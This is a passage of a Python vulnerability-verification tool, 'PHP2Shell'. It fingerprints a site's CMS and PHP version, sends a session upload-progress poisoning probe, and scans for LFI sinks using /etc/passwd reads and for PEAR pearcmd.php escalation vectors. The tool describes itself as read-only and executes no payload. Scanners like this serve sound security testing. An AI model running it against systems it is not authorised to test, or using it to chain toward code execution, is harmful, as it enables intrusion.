def probe_include_sinks(base_url, session, cms_name="default"):
    """Check for candidate include()/LFI sinks that could be chained with a
    poisoned session file. CMS-aware; falls back to a default list.
    Read-only /etc/passwd probes only."""
    candidates = CMS_SINK_SIGNATURES.get(cms_name, CMS_SINK_SIGNATURES["default"])
    hits = []
    for path, needle in candidates:
        url = urljoin(base_url + "/", path.lstrip("/"))
        try:
            r = session.get(url, timeout=TIMEOUT, allow_redirects=True)
        except requests.RequestException:
            continue
        if needle and re.search(needle, r.text or ""):
            hits.append((path, r.status_code))
    return hits


def probe_pearcmd(base_url, session):
    """Check for the PEAR `pearcmd.php` + `register_argc_argv` sink that is a
    well-known LFI->RCE escalation vector (cf. HackTricks / Patchstack
    WordPress 7.1.2 CVE-2026-87902 research). Read-only presence check only:
    this reports whether the file exists and whether argc/argv appear enabled,
    WITHOUT executing anything."""
    findings = []
    # 1. Does pearcmd.php exist and expose its command surface?
    for path in ("/pearcmd.php", "/pear/pearcmd.php", "/usr/share/php/pearcmd.php"):
        url = urljoin(base_url + "/", path.lstrip("/"))
        try:
            r = session.get(url, timeout=TIMEOUT, allow_redirects=True)
        except requests.RequestException:
            continue
        if r.status_code == 200 and re.search(r"pear|command", r.text or "", re.I):
            findings.append((path, "pearcmd present (argc/argv sink candidate)"))
            break

    # 2. Probe register_argc_argv via a benign argv reflection: request the
    #    homepage with a harmless query arg and see if it is reflected in a
    #    way consistent with register_argc_argv=On. (Observational only.)
    try:
        probe = base_url + "/?php2shell_argv_probe=1"
        r = session.get(probe, timeout=TIMEOUT, allow_redirects=True)
        body = r.text or ""
        # Heuristic: some apps/phpinfo echo argv; this is a weak signal only.
        if re.search(r"php2shell_argv_probe|argv", body, re.I):
            findings.append(("/?argv probe", "argv reflection observed (register_argc_argv may be On)"))
    except requests.RequestException:
        pass

    return findings


# ---------------------------------------------------------------------------
# Main flow
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PHP2Shell research tool: CMS/PHP detection + "
                    "session.upload_progress poisoning verification (CVE-2026-109618/109619).")
    parser.add_argument("--url", "-u", help="Target URL (e.g. https://example.com)")
    parser.add_argument("--probe-path", default="/index.php",
                        help="Path to send the upload-progress probe to (default: /index.php)")
    parser.add_argument("--sink-scan", action="store_true",
                        help="Also probe for candidate include()/LFI sinks")
    parser.add_argument("--mode", choices=MODES, default="passive",
                        help="passive = single inert probe (default); "
                             "active = filter-evasion + race probe (still no code execution)")
    parser.add_argument("--no-confirm", action="store_true",
                        help="Skip confirmation prompt before sending the probe")
    args = parser.parse_args()

    banner()

    target = prompt_url(args.url)
    if not target:
        print(C.dim("[*] Exiting."))
        sys.exit(0)

    session = make_session()
    base_url = target.rstrip("/")

    # 1. Detect CMS
    print(C.blue("\n[*] Detecting CMS..."))
    cms = detect_cms(base_url, session)
    print(C.green(f"[+] CMS          : {cms['name']}"))
    print(C.green(f"[+] Confidence   : {cms['confidence']}"))
    for ev in cms["evidence"]:
        print(C.dim(f"      - {ev}"))

    # 1b. Deeper behavior/version probes for the winning CMS
    behaviors = detect_cms_behavior(base_url, session, cms["name"])
    if behaviors:
        print(C.cyan(f"[*] CMS behavior / version probes:"))
        for path, val in behaviors:
            print(C.green(f"[+]   {path} -> {val}"))

    # 2. Detect PHP
    print(C.blue("\n[*] Detecting PHP version / type..."))
    php = detect_php(base_url, session)
    if php["version"]:
        print(C.green(f"[+] PHP version  : {php['version']}"))
    else:
        print(C.yellow("[+] PHP version  : not detected (expose_php may be Off)"))
    if php["type"]:
        print(C.green(f"[+] PHP type     : {php['type']}"))
    if php["support"]:
        s = php["support"]
        color = C.red if s["status"] == "eol" else (C.yellow if s["status"] == "security" else C.green)
        print(color(f"[+] Support      : {s['status']} ({s['note']})"))
    for ev in php["evidence"]:
        print(C.dim(f"      - {ev}"))

    # 2b. Defensive config exposure (observational, no memory corruption)
    print(C.blue("\n[*] Assessing config exposure (defensive, read-only)..."))
    cfg = detect_config_exposure(base_url, session)
    def _kv(k, v):
        return C.dim(f"      - {k}: {v}") if v is not None else C.dim(f"      - {k}: not observable")
    print(_kv("upload_progress", cfg["upload_progress"]))
    print(_kv("cleanup", cfg["cleanup"]))
    print(_kv("memory_limit", cfg["memory_limit"]))
    print(_kv("post_max_size", cfg["post_max_size"]))
    print(_kv("SAPI", cfg["sapi"]))
    for n in cfg["notes"]:
        print(C.dim(f"        · {n}"))

    # 3. Confirm before sending the poisoning primitive
    if not args.no_confirm:
        print()
        if args.mode == "active":
            print(C.yellow("[!] mode=active: will send concurrent + large-body probes "
                           "(race against session cleanup). Still NO code execution."))
        ans = input(C.yellow(
            f"[?] Send upload-progress probe (mode={args.mode})? [y/N]: ")).strip().lower()
        if ans not in ("y", "yes"):
            print(C.dim("[*] Cancelled by user."))
            sys.exit(0)

    # 4. Probe the primitive
    mode = args.mode
    print(C.blue(f"\n[*] Sending session.upload_progress probe (mode={mode})..."))
    obs = probe_upload_progress(base_url, session, args.probe_path, mode=mode)
    print(C.yellow(f"[i] Mode         : {obs['mode']}"))
    print(C.yellow(f"[i] Session id   : {obs['sid']}"))
    print(C.yellow(f"[i] Inert canary : {obs['canary']!r}"))
    for n in obs["notes"]:
        print(C.dim(f"      - {n}"))

    if obs["php_session_set"]:
        via = f" (via {obs['p1_via']})" if obs.get("p1_via") else ""
        print(C.green("[+] P1 CONFIRMED: PHP accepted the cookie-less session id"
                      f"{via}."))
    elif obs["status"] is not None:
        print(C.yellow("[~] P1 status: session id sent, but no session cookie in response "
                       "(app may use a custom session name, or upload_progress disabled)."))
    else:
        print(C.red("[-] Request failed — target unreachable or filtering the request."))

    if obs.get("progress_marker_seen"):
        print(C.green("[+] P2 CORROBORATED: target confirms the upload-progress marker reached PHP."))

    # 4b. Coarse exposure verdict
    verdict = assess_vulnerability(obs, php)
    vc = C.red if verdict["color"] == "red" else (C.yellow if verdict["color"] == "yellow" else C.green)
    print()
    print(vc(C.bold(f"[=>] VERDICT: {verdict['label']}")))
    for r in verdict["reasons"]:
        print(C.dim(f"      - {r}"))

    print(C.yellow(
        "\n[i] IMPORTANT: the above verifies the session.upload_progress "
        "content-injection primitive ONLY."))
    print(C.yellow(
        "[i] It does NOT mean code execution. RCE requires an app-side "
        "include()/require() of the poisoned session file (an LFI/include sink)."))
    print(C.yellow(
        "[i] Official affected/fixed versions are still unpublished; this verdict "
        "is an estimate based on observable primitive + PHP branch support."))

    # 5. Optional sink scan
    if args.sink_scan:
        print(C.blue("\n[*] Probing candidate include()/LFI sinks..."))
        sinks = probe_include_sinks(base_url, session, cms_name=cms["name"])
        if sinks:
            for path, code in sinks:
                print(C.green(f"[+] Potential sink: {path} -> {code}"))
        else:
            print(C.dim("[-] No obvious include/LFI sink found in the candidate list."))

        print(C.blue("[*] Probing PEAR pearcmd.php / register_argc_argv sink..."))
        pear = probe_pearcmd(base_url, session)
        if pear:
            for path, note in pear:
                print(C.green(f"[+] {path}: {note}"))
        else:
            print(C.dim("[-] pearcmd.php not found / argv not reflected."))

    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(C.dim("\n[*] Interrupted."))
        sys.exit(130)
